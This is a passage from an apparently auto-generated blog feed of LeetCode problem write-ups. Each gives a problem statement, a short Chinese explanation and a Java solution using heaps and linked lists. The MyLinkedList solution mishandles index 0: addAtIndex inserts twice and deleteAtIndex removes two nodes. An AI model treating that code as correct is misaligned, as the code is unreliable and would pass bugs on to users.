<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int k &#x3D; 3;</span><br><span class="line">int[] arr &#x3D; [4,5,8,2];</span><br><span class="line">KthLargest kthLargest &#x3D; new KthLargest(3, arr);</span><br><span class="line">kthLargest.add(3);   &#x2F;&#x2F; returns 4</span><br><span class="line">kthLargest.add(5);   &#x2F;&#x2F; returns 5</span><br><span class="line">kthLargest.add(10);  &#x2F;&#x2F; returns 5</span><br><span class="line">kthLargest.add(9);   &#x2F;&#x2F; returns 8</span><br><span class="line">kthLargest.add(4);   &#x2F;&#x2F; returns 8</span><br></pre></td></tr></table></figure>

<h2 id="Note："><a href="#Note：" class="headerlink" title="Note："></a>Note：</h2><ul>
<li>You may assume that <code>nums</code>‘ length ≥ <code>k-1</code> and <code>k</code> ≥ 1.</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：小顶堆"><a href="#解法一：小顶堆" class="headerlink" title="解法一：小顶堆"></a>解法一：小顶堆</h3><p>维护一个K个元素大小的小顶堆，那么堆顶元素就是第K个大小的了。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KthLargest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> PriorityQueue&lt;Integer&gt; values;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> kth;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">KthLargest</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.kth = k;</span><br><span class="line">        values = <span class="keyword">new</span> PriorityQueue&lt;&gt;(k);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">        	values.add(num);</span><br><span class="line">        	<span class="keyword">if</span> (values.size() &gt; kth) &#123;</span><br><span class="line">        		values.poll();</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        values.add(val);</span><br><span class="line">        <span class="keyword">if</span> (values.size() &gt; kth) &#123;</span><br><span class="line">        	values.poll();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> values.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>707. Design Linked List</title>
    <url>/2020/03/25/LeetCode/leetcode-000707-Design%20Linked%20List/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Design your implementation of the linked list. You can choose to use the singly linked list or the doubly linked list. A node in a singly linked list should have two attributes: <code>val</code> and <code>next</code>. <code>val</code> is the value of the current node, and <code>next</code> is a pointer/reference to the next node. If you want to use the doubly linked list, you will need one more attribute <code>prev</code> to indicate the previous node in the linked list. Assume all nodes in the linked list are 0-indexed.</p>
<p>Implement these functions in your linked list class:</p>
<ul>
<li><code>get(index)</code> : Get the value of the <code>index</code>-th node in the linked list. If the index is invalid, return <code>-1</code>.</li>
<li><code>addAtHead(val)</code> : Add a node of value <code>val</code> before the first element of the linked list. After the insertion, the new node will be the first node of the linked list.</li>
<li><code>addAtTail(val)</code> : Append a node of value <code>val</code> to the last element of the linked list.</li>
<li><code>addAtIndex(index, val)</code> : Add a node of value <code>val</code> before the <code>index</code>-th node in the linked list. If <code>index</code> equals to the length of linked list, the node will be appended to the end of linked list. If index is greater than the length, the node will not be inserted.</li>
<li><code>deleteAtIndex(index)</code> : Delete the <code>index</code>-th node in the linked list, if the index is valid.</li>
</ul>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: </span><br><span class="line">[&quot;MyLinkedList&quot;,&quot;addAtHead&quot;,&quot;addAtTail&quot;,&quot;addAtIndex&quot;,&quot;get&quot;,&quot;deleteAtIndex&quot;,&quot;get&quot;]</span><br><span class="line">[[],[1],[3],[1,2],[1],[1],[1]]</span><br><span class="line">Output:  </span><br><span class="line">[null,null,null,null,2,null,3]</span><br><span class="line"></span><br><span class="line">Explanation:</span><br><span class="line">MyLinkedList linkedList &#x3D; new MyLinkedList(); &#x2F;&#x2F; Initialize empty LinkedList</span><br><span class="line">linkedList.addAtHead(1);</span><br><span class="line">linkedList.addAtTail(3);</span><br><span class="line">linkedList.addAtIndex(1, 2);  &#x2F;&#x2F; linked list becomes 1-&gt;2-&gt;3</span><br><span class="line">linkedList.get(1);            &#x2F;&#x2F; returns 2</span><br><span class="line">linkedList.deleteAtIndex(1);  &#x2F;&#x2F; now the linked list is 1-&gt;3</span><br><span class="line">linkedList.get(1);            &#x2F;&#x2F; returns 3</span><br></pre></td></tr></table></figure>

<h2 id="Constraints"><a href="#Constraints" class="headerlink" title="Constraints:"></a>Constraints:</h2><ul>
<li><code>0 &lt;= index,val &lt;= 1000</code></li>
<li>Please do not use the built-in LinkedList library.</li>
<li>At most <code>2000</code> calls will be made to <code>get</code>, <code>addAtHead</code>, <code>addAtTail</code>, <code>addAtIndex</code> and <code>deleteAtIndex</code>.</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyLinkedList</span> </span>&#123;</span><br><span class="line">		LinkNode head = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">MyLinkedList</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">		 * Get the value of the index-th node in the linked list. If the index</span></span><br><span class="line"><span class="comment">		 * is invalid, return -1.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">			LinkNode currentNode = head;</span><br><span class="line">			<span class="keyword">while</span> (index &gt; <span class="number">0</span> &amp;&amp; currentNode != <span class="keyword">null</span>) &#123;</span><br><span class="line">				currentNode = currentNode.next;</span><br><span class="line">				index--;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (currentNode == <span class="keyword">null</span>)</span><br><span class="line">				<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">			<span class="keyword">return</span> currentNode.val;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">		 * Add a node of value val before the first element of the linked list.</span></span><br><span class="line"><span class="comment">		 * After the insertion, the new node will be the first node of the</span></span><br><span class="line"><span class="comment">		 * linked list.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addAtHead</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (head == <span class="keyword">null</span>) &#123;</span><br><span class="line">				head = <span class="keyword">new</span> LinkNode(val, <span class="keyword">null</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				LinkNode node = <span class="keyword">new</span> LinkNode(val, head);</span><br><span class="line">				head = node;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">		 * Append a node of value val to the last element of the linked list.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addAtTail</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (head == <span class="keyword">null</span>) &#123;</span><br><span class="line">				head = <span class="keyword">new</span> LinkNode(val, <span class="keyword">null</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				LinkNode currentNode = head;</span><br><span class="line">				<span class="keyword">while</span> (currentNode.next != <span class="keyword">null</span>)</span><br><span class="line">					currentNode = currentNode.next;</span><br><span class="line">				currentNode.next = <span class="keyword">new</span> LinkNode(val, <span class="keyword">null</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">		 * Add a node of value val before the index-th node in the linked list.</span></span><br><span class="line"><span class="comment">		 * If index equals to the length of linked list, the node will be</span></span><br><span class="line"><span class="comment">		 * appended to the end of linked list. If index is greater than the</span></span><br><span class="line"><span class="comment">		 * length, the node will not be inserted.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addAtIndex</span><span class="params">(<span class="keyword">int</span> index, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (index == <span class="number">0</span>)</span><br><span class="line">				addAtHead(val);</span><br><span class="line">			LinkNode currentNode = head;</span><br><span class="line">			<span class="keyword">while</span> (index &gt; <span class="number">1</span> &amp;&amp; currentNode != <span class="keyword">null</span>) &#123;</span><br><span class="line">				currentNode = currentNode.next;</span><br><span class="line">				index--;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (currentNode != <span class="keyword">null</span>)</span><br><span class="line">				currentNode.next = <span class="keyword">new</span> LinkNode(val, currentNode.next);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">		 * Delete the index-th node in the linked list, if the index is valid.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteAtIndex</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (index == <span class="number">0</span> &amp;&amp; head != <span class="keyword">null</span>)</span><br><span class="line">				head = head.next;</span><br><span class="line">			LinkNode currentNode = head;</span><br><span class="line">			<span class="keyword">while</span> (index &gt; <span class="number">1</span> &amp;&amp; currentNode != <span class="keyword">null</span>) &#123;</span><br><span class="line">				currentNode = currentNode.next;</span><br><span class="line">				index--;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (currentNode != <span class="keyword">null</span> &amp;&amp; currentNode.next != <span class="keyword">null</span>)</span><br><span class="line">				currentNode.next = currentNode.next.next;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">LinkNode</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> val;</span><br><span class="line">		LinkNode next;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">LinkNode</span><span class="params">(<span class="keyword">int</span> val, LinkNode next)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.val = val;</span><br><span class="line">			<span class="keyword">this</span>.next = next;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>759. Employee Free Time</title>
    <url>/2020/03/25/LeetCode/leetcode-000759.%20Employee%20Free%20Time/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ol>
<li><p>We are given a list <code>schedule</code> of employees, which represents the working time for each employee.</p>
<p> Each employee has a list of non-overlapping <code>Intervals</code>, and these intervals are in sorted order.</p>
<p> Return the list of finite intervals representing common, positive-length free time for <em>all</em> employees, also in sorted order.</p>
</li>
</ol>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: schedule &#x3D; [[[1,2],[5,6]],[[1,3]],[[4,10]]]</span><br><span class="line">Output: [[3,4]]</span><br><span class="line">Explanation:</span><br><span class="line">There are a total of three employees, and all common</span><br><span class="line">free time intervals would be [-inf, 1], [3, 4], [10, inf].</span><br><span class="line">We discard any intervals that contain inf as they aren&#39;t finite.</span><br></pre></td></tr></table></figure>

<h2 id="Example-2："><a href="#Example-2：" class="headerlink" title="Example 2："></a>Example 2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: schedule = [[[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">6</span>,<span class="number">7</span>]],[[<span class="number">2</span>,<span class="number">4</span>]],[[<span class="number">2</span>,<span class="number">5</span>],[<span class="number">9</span>,<span class="number">12</span>]]]</span><br><span class="line">Output: [[<span class="number">5</span>,<span class="number">6</span>],[<span class="number">7</span>,<span class="number">9</span>]]</span><br><span class="line"></span><br><span class="line">(Even though we are representing Intervals in the form [x, y], the objects inside are Intervals, not lists or arrays. For example, schedule[<span class="number">0</span>][<span class="number">0</span>].start = <span class="number">1</span>, schedule[<span class="number">0</span>][<span class="number">0</span>].end = <span class="number">2</span>, and schedule[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>] is not defined.)</span><br><span class="line"></span><br><span class="line">Also, we wouldn<span class="string">'t include intervals like [5, 5] in our answer, as they have zero length.</span></span><br></pre></td></tr></table></figure>

<h2 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h2><ol>
<li><code>schedule</code> and <code>schedule[i]</code> are lists with lengths in range <code>[1, 50]</code>.</li>
<li><code>0 &lt;= schedule[i].start &lt; schedule[i].end &lt;= 10^8</code>.</li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>先把每个表头放在minHeap中. minHeap按照指向的Interval start排序.</p>
<p>poll出来的就是当前最小start的interval. 如果标记的时间比这个interval的start还小就说明出现了断裂也就是空余时间. </p>
<p>把标记时间增大到这个interval的end, 并且把这个interval所在链表的后一位加入minHeap中.</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Interval</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> start;</span><br><span class="line">		<span class="keyword">int</span> end;</span><br><span class="line"></span><br><span class="line">		Interval() &#123;</span><br><span class="line">			start = <span class="number">0</span>;</span><br><span class="line">			end = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		Interval(<span class="keyword">int</span> s, <span class="keyword">int</span> e) &#123;</span><br><span class="line">			start = s;</span><br><span class="line">			end = e;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> List&lt;Interval&gt; <span class="title">employeeFreeTime</span><span class="params">(List&lt;List&lt;Interval&gt;&gt; schedule)</span> </span>&#123;</span><br><span class="line">		List&lt;Interval&gt; res = <span class="keyword">new</span> ArrayList&lt;Interval&gt;();</span><br><span class="line">		PriorityQueue&lt;Node&gt; minHeap = <span class="keyword">new</span> PriorityQueue&lt;Node&gt;(</span><br><span class="line">				(a, b) -&gt; schedule.get(a.employee).get(a.index).start - schedule.get(b.employee).get(b.index).start);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> start = Integer.MAX_VALUE;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; schedule.size(); i++) &#123;</span><br><span class="line">			minHeap.add(<span class="keyword">new</span> Node(i, <span class="number">0</span>));</span><br><span class="line">			start = Math.min(start, schedule.get(i).get(<span class="number">0</span>).start);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (!minHeap.isEmpty()) &#123;</span><br><span class="line">			Node cur = minHeap.poll();</span><br><span class="line">			<span class="keyword">if</span> (start &lt; schedule.get(cur.employee).get(cur.index).start) &#123;</span><br><span class="line">				res.add(<span class="keyword">new</span> Interval(start, schedule.get(cur.employee).get(cur.index).start));</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			start = Math.max(start, schedule.get(cur.employee).get(cur.index).end);</span><br><span class="line">			cur.index++;</span><br><span class="line">			<span class="keyword">if</span> (cur.index &lt; schedule.get(cur.employee).size()) &#123;</span><br><span class="line">				minHeap.add(cur);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> employee;</span><br><span class="line">		<span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(<span class="keyword">int</span> employee, <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.employee = employee;</span><br><span class="line">			<span class="keyword">this</span>.index = index;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>973. K Closest Points to Origin</title>
    <url>/2020/03/25/LeetCode/leetcode-000973.K%20Closest%20Points%20to%20Origin/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>We have a list of <code>points</code> on the plane. Find the <code>K</code> closest points to the origin <code>(0, 0)</code>.</p>
<p>(Here, the distance between two points on a plane is the Euclidean distance.)</p>
<p>You may return the answer in any order. The answer is guaranteed to be unique (except for the order that it is in.)</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: points &#x3D; [[1,3],[-2,2]], K &#x3D; 1</span><br><span class="line">Output: [[-2,2]]</span><br><span class="line">Explanation: </span><br><span class="line">The distance between (1, 3) and the origin is sqrt(10).</span><br><span class="line">The distance between (-2, 2) and the origin is sqrt(8).</span><br><span class="line">Since sqrt(8) &lt; sqrt(10), (-2, 2) is closer to the origin.</span><br><span class="line">We only want the closest K &#x3D; 1 points from the origin, so the answer is just [[-2,2]].</span><br></pre></td></tr></table></figure>

<h2 id="Example-2："><a href="#Example-2：" class="headerlink" title="Example 2："></a>Example 2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: points = [[<span class="number">3</span>,<span class="number">3</span>],[<span class="number">5</span>,-<span class="number">1</span>],[-<span class="number">2</span>,<span class="number">4</span>]], K = <span class="number">2</span></span><br><span class="line">Output: [[<span class="number">3</span>,<span class="number">3</span>],[-<span class="number">2</span>,<span class="number">4</span>]]</span><br><span class="line">(The answer [[-<span class="number">2</span>,<span class="number">4</span>],[<span class="number">3</span>,<span class="number">3</span>]] would also be accepted.)</span><br></pre></td></tr></table></figure>

<h2 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h2><ol>
<li><code>1 &lt;= K &lt;= points.length &lt;= 10000</code></li>
<li><code>-10000 &lt; points[i][0] &lt; 10000</code></li>
<li><code>-10000 &lt; points[i][1] &lt; 10000</code></li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>构造一个小顶堆，取K个即可。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> index;</span><br><span class="line">		<span class="keyword">double</span> distance;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">Point</span><span class="params">(<span class="keyword">int</span> index, <span class="keyword">double</span> distance)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.index = index;</span><br><span class="line">			<span class="keyword">this</span>.distance = distance;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getIndex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> index;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setIndex</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.index = index;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getDistance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> distance;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDistance</span><span class="params">(<span class="keyword">double</span> distance)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.distance = distance;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">int</span>[][] kClosest(<span class="keyword">int</span>[][] points, <span class="keyword">int</span> K) &#123;</span><br><span class="line">        PriorityQueue&lt;Point&gt; points2 = <span class="keyword">new</span> PriorityQueue&lt;Point&gt;(K, <span class="keyword">new</span> Comparator&lt;Point&gt;() &#123;</span><br><span class="line"></span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Point o1, Point o2)</span> </span>&#123;</span><br><span class="line">				<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">				<span class="keyword">if</span> (o1.getDistance() - o2.getDistance() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (o1.getDistance() - o2.getDistance() == <span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; points.length;i++) &#123;</span><br><span class="line">        	Point point = <span class="keyword">new</span> Point(i, Math.sqrt(points[i][<span class="number">0</span>] * points[i][<span class="number">0</span>] + points[i][<span class="number">1</span>] * points[i][<span class="number">1</span>]));</span><br><span class="line">        	points2.add(point);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span>[][] result = <span class="keyword">new</span> <span class="keyword">int</span>[K][<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (index &lt; K &amp;&amp; points2.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        	Point point = points2.poll();</span><br><span class="line">        	result[index][<span class="number">0</span>] = points[point.index][<span class="number">0</span>];</span><br><span class="line">        	result[index][<span class="number">1</span>] = points[point.index][<span class="number">1</span>];</span><br><span class="line">        	index++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>1290. Convert Binary Number in a Linked List to Integer</title>
    <url>/2020/03/25/LeetCode/leetcode-001290-Convert%20Binary%20Number%20in%20a%20Linked%20List%20to%20Integer/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given <code>head</code> which is a reference node to a singly-linked list. The value of each node in the linked list is either 0 or 1. The linked list holds the binary representation of a number.</p>
<p>Return the <em>decimal value</em> of the number in the linked list.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><p><img src="https://assets.leetcode.com/uploads/2019/12/05/graph-1.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: head &#x3D; [1,0,1]</span><br><span class="line">Output: 5</span><br><span class="line">Explanation: (101) in base 2 &#x3D; (5) in base 10</span><br></pre></td></tr></table></figure>

<h2 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2:"></a>Example 2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: head &#x3D; [0]</span><br><span class="line">Output: 0</span><br></pre></td></tr></table></figure>

<h2 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3:"></a>Example 3:</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: head = [<span class="number">1</span>]</span><br><span class="line">Output: <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="Example-4"><a href="#Example-4" class="headerlink" title="Example 4:"></a>Example 4:</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: head = [<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">Output: <span class="number">18880</span></span><br></pre></td></tr></table></figure>

<h2 id="Example-5"><a href="#Example-5" class="headerlink" title="Example 5:"></a>Example 5:</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: head = [<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">Output: <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="Constraints"><a href="#Constraints" class="headerlink" title="Constraints:"></a>Constraints:</h2><ul>
<li>The Linked List is not empty.</li>
<li>Number of nodes will not exceed <code>30</code>.</li>
<li>Each node’s value is either <code>0</code> or <code>1</code>.</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>位运算</p>
<p>初始化value为head.val.每当链表向后取值一位，value的值就乘以2，接着加上head.next.val的值就行了</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getDecimalValue</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> value = head.val;</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">null</span> != head.next) &#123;</span><br><span class="line">			head = head.next;</span><br><span class="line">			value = value &lt;&lt; <span class="number">1</span>;</span><br><span class="line">			value += head.val;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h4><p>用StringBuilder生成一个二进制字符串，然后用parseInt(value, radix)转成十进制</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getDecimalValue</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">		StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		sb.append(head.val);</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">null</span> != head.next) &#123;</span><br><span class="line">			head = head.next;</span><br><span class="line">			sb.append(head.val);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> Integer.parseInt(sb.toString(), <span class="number">2</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>79. Word Search</title>
    <url>/2020/03/24/LeetCode/leetcode-000079.%20Word%20Search/</url>
